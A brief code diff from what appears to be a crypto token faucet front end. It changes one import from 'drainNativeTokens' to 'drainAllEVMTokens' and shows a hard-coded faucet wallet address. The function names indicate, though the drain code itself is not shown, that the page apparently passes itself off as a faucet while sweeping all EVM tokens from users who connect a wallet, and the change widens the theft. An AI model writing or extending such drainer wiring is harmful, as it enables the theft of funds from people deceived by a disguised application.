@@ -14,7 +14,7 @@ import { getMintProgramId } from '@/utils/tokenProgram';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import apepeImage from '@/assets/apepe.jpg';
 
 const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
